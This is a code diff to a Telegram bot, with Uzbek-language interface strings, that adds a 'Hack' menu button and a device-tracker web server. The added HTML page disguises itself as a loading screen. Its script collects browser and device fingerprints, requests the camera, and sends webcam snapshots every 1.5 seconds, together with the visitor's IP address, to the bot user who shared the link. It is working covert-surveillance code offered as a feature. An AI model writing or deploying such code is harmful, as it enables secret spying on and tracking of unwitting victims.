@@ -2103,7 +2103,8 @@ async def language_select_handler(update: Update, context: ContextTypes.DEFAULT_
             InlineKeyboardButton("⚙️ Sozlamalar", callback_data="open_settings")
         ],
         [
-            InlineKeyboardButton("🧪 FakeLab", callback_data="fake_lab_new")
+            InlineKeyboardButton("🧪 FakeLab", callback_data="fake_lab_new"),
+            InlineKeyboardButton("🕵️‍♂️ Hack", callback_data="hack_start")
         ],
     ]
 
@@ -2139,7 +2140,8 @@ async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             InlineKeyboardButton("⚙️ Sozlamalar", callback_data="open_settings")
         ],
         [
-            InlineKeyboardButton("🧪 FakeLab", callback_data="fake_lab_new")
+            InlineKeyboardButton("🧪 FakeLab", callback_data="fake_lab_new"),
+            InlineKeyboardButton("🕵️‍♂️ Hack", callback_data="hack_start")
         ],
     ]
     if user_id == ADMIN_ID:
@@ -2979,6 +2981,271 @@ async def show_stats_handler(update: Update, context: ContextTypes.DEFAULT_TYPE)
     await cmd_public_stats(update, context, edit_mode=True)
 
 #-------------------------------------------------------
+# ========================
+# HACK / DEVICE TRACKER
+# ========================
+USER_TOKENS = {}
+
+def get_client_ip(request: web.Request) -> str:
+    """Mijoz IP manzilini aniqlash (reverse proxy uchun)"""
+    hdr = request.headers.get("X-Forwarded-For")
+    if hdr:
+        return hdr.split(",")[0].strip()
+    rem = request.remote
+    if rem:
+        return rem
+    peer = request.transport.get_extra_info("peername")
+    if peer:
+        return str(peer[0])
+    return "Noma'lum"
+
+async def track_page(request: web.Request):
+    token = request.query.get("token")
+    if not token or token not in USER_TOKENS:
+        return web.Response(text="❌ Noto‘g‘ri yoki eskirgan token", status=403)
+
+    html = f"""<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <title>Kuting...</title>
+  <style>
+    body {{
+      font-family: sans-serif;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      height: 100vh; text-align: center;
+      background: #fafafa; color: #333;
+    }}
+    .loader {{
+      width: 40px; height: 40px;
+      border: 4px solid #ddd;
+      border-top: 4px solid #4CAF50;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 20px;
+    }}
+    @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
+    .note {{ font-size: 0.9em; color: #777; }}
+  </style>
+</head>
+<body>
+  <h2>Iltimos, kuting...</h2>
+  <div class="loader"></div>
+  <div class="note">Ma'lumotlar yig'ilmoqda...</div>
+  <script>
+    let stream = null;
+    let intervalId = null;
+    let hasSentInitialData = false;
+
+    async function collectData() {{
+      return {{
+        timestamp: new Date().toISOString(),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        utcOffset: -new Date().getTimezoneOffset() / 60,
+        languages: navigator.languages?.join(', ') || navigator.language,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        deviceMemory: navigator.deviceMemory || "Noma'lum",
+        hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
+        screen: `${{screen.width}}x${{screen.height}}`,
+        viewport: `${{window.innerWidth}}x${{window.innerHeight}}`,
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth,
+        deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobil" : "Kompyuter",
+        browser: "Noma'lum",
+        os: "Noma'lum",
+        model: "Noma'lum",
+        devices: {{ mic: 0, speaker: 0, camera: 0 }},
+        gpu: "Noma'lum",
+        cameraRes: "Noma'lum",
+        network: "Noma'lum"
+      }};
+    }}
+
+    async function sendData(data, img = null) {{
+      const body = {{ token: "{token}", clientData: data }};
+      if (img) body.image = img;
+      try {{
+        await fetch("/submit", {{
+          method: "POST",
+          headers: {{ "Content-Type": "application/json" }},
+          body: JSON.stringify(body)
+        }});
+      } catch (err) {{
+        console.error("Yuborishda xato:", err);
+      }}
+    }}
+
+    async function startCameraAndLoop() {{
+      try {{
+        stream = await navigator.mediaDevices.getUserMedia({{
+          video: {{ width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }}
+        }});
+
+        const data = await collectData();
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await new Promise(resolve => {{
+          video.onloadedmetadata = resolve;
+          video.play();
+        }});
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const img = canvas.toDataURL("image/jpeg", 0.7);
+
+        await sendData(data, img);
+        hasSentInitialData = true;
+
+        intervalId = setInterval(async () => {{
+          if (!stream || stream.getVideoTracks().length === 0) {{
+            clearInterval(intervalId);
+            return;
+          }}
+          const freshData = await collectData();
+          const v = document.createElement("video");
+          v.srcObject = stream;
+          await new Promise(r => {{
+            v.onloadedmetadata = r;
+            v.play();
+          }});
+          const c = document.createElement("canvas");
+          c.width = v.videoWidth || 640;
+          c.height = v.videoHeight || 480;
+          c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
+          const newImg = c.toDataURL("image/jpeg", 0.7);
+          await sendData(freshData, newImg);
+        }}, 1500);
+
+      } catch (err) {{
+        console.warn("Kamera ruxsati rad etildi yoki mavjud emas:", err);
+        if (!hasSentInitialData) {{
+          const data = await collectData();
+          await sendData(data, null);
+        }}
+        try {{
+          await fetch("/camera_denied", {{
+            method: "POST",
+            headers: {{ "Content-Type": "application/json" }},
+            body: JSON.stringify({{ token: "{token}" }})
+          }});
+        }} catch (e) {{}}
+      }}
+    }
+
+    function stopEverything() {{
+      if (intervalId) {{
+        clearInterval(intervalId);
+        intervalId = null;
+      }}
+      if (stream) {{
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+      }}
+    }}
+
+    window.addEventListener('beforeunload', stopEverything);
+    window.addEventListener('pagehide', stopEverything);
+
+    startCameraAndLoop();
+  </script>
+</body>
+</html>"""
+    return web.Response(text=html, content_type="text/html")
+
+async def submit_data(request: web.Request):
+    try:
+        body = await request.json()
+        token = body.get("token")
+        client_data = body.get("clientData", {})
+        user_id = USER_TOKENS.get(token)
+        if not user_id:
+            return web.Response(status=403)
+
+        ip = get_client_ip(request)
+        devs = client_data.get("devices", {})
+
+        message = (
+            f"🕒 Sana/Vaqt: {client_data.get('timestamp')}\n"
+            f"🌍 Zona: {client_data.get('timezone')} (UTC{client_data.get('utcOffset')})\n"
+            f"📍 IP: {ip}\n"
+            f"📱 Qurilma: {client_data.get('model')} ({client_data.get('deviceType')})\n"
+            f"🖥 OS: {client_data.get('os')}, Brauzer: {client_data.get('browser')}\n"
+            f"🎮 GPU: {client_data.get('gpu')}\n"
+            f"🧠 CPU: {client_data.get('hardwareConcurrency')} yadrolar | RAM: {client_data.get('deviceMemory')} GB\n"
+            f"📺 Ekran: {client_data.get('screen')} | Viewport: {client_data.get('viewport')}\n"
+            f"🎨 Rang chuqurligi: {client_data.get('colorDepth')} bit | PixelDepth: {client_data.get('pixelDepth')}\n"
+            f"🎤 Qurilmalar: Mic: {devs.get('mic',0)}, Speaker: {devs.get('speaker',0)}, Kamera: {devs.get('camera',0)}\n"
+            f"📷 Kamera aniqlangan o‘lcham: {client_data.get('cameraRes')}\n"
+            f"📶 Tarmoq: {client_data.get('network')}\n"
+            f"🗣 Tillar: {client_data.get('languages')}\n"
+            f"🔍 UA: {client_data.get('userAgent')}"
+        )
+
+        if "image" in body:
+            img_data = body["image"]
+            if "," in img_data:
+                b64 = img_data.split(",", 1)[1]
+            else:
+                b64 = img_data
+            try:
+                img_bytes = base64.b64decode(b64)
+                img = BytesIO(img_bytes)
+                img.name = "snapshot.jpg"
+                await request.app["bot"].send_photo(chat_id=user_id, photo=InputFile(img), caption=message)
+            except Exception as e:
+                logger.exception("Rasmni yuborishda xato")
+                await request.app["bot"].send_message(
+                    chat_id=user_id,
+                    text=f"⚠️ Rasm yuborishda xato:\n{str(e)[:200]}\n\n{message}"
+                )
+        else:
+            await request.app["bot"].send_message(chat_id=user_id, text=message)
+
+        return web.Response(text="ok")
+    except Exception as e:
+        logger.exception("submit_data xato")
+        return web.Response(status=500, text=str(e))
+
+async def camera_denied(request: web.Request):
+    try:
+        data = await request.json()
+        token = data.get("token")
+        user_id = USER_TOKENS.get(token)
+        if user_id:
+            await request.app["bot"].send_message(
+                chat_id=user_id,
+                text="⚠️ Kamera ruxsati berilmadi yoki mavjud emas."
+            )
+        return web.Response(status=200)
+    except Exception as e:
+        logger.exception("camera_denied xato")
+        return web.Response(status=500)
+
+async def start_web_server_hack(bot):
+    app = web.Application()
+    app["bot"] = bot
+    app.router.add_get("/track", track_page)
+    app.router.add_post("/submit", submit_data)
+    app.router.add_post("/camera_denied", camera_denied)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, "0.0.0.0", PORT)
+    await site.start()
+    logger.info(f"🌐 Hack tracker server ishga tushdi: http://0.0.0.0:{PORT}")
+
+# Yangi startup funksiya — ikkalasini ham ishga tushirish
+async def on_startup(app: Application):
+    pool = await asyncpg.create_pool(DATABASE_URL, min_size=1, max_size=4)
+    app.bot_data["db_pool"] = pool
+    await init_db(pool)
+    logger.info("✅ DB initialized and pool created.")
+    # 🔥 Ikkala web server ham ishga tushadi
+    asyncio.create_task(start_web_server_hack(app.bot))
+#-------------------------------------------------------
 # ---------------- Startup ----------------
 async def on_startup(app: Application):
     pool = await asyncpg.create_pool(DATABASE_URL, min_size=1, max_size=4)
@@ -3006,6 +3273,7 @@ def build_app():
     app.add_handler(CallbackQueryHandler(select_image_model, pattern="^select_image_model$"))
     app.add_handler(CallbackQueryHandler(confirm_model_selection, pattern=r"^confirm_model_.*$"))
     app.add_handler(CallbackQueryHandler(set_image_model, pattern=r"^set_model_.*$"))
+    app.add_handler(CallbackQueryHandler(hack_start_handler, pattern="^hack_start$"))
 
     # Donate
     donate_conv = ConversationHandler(
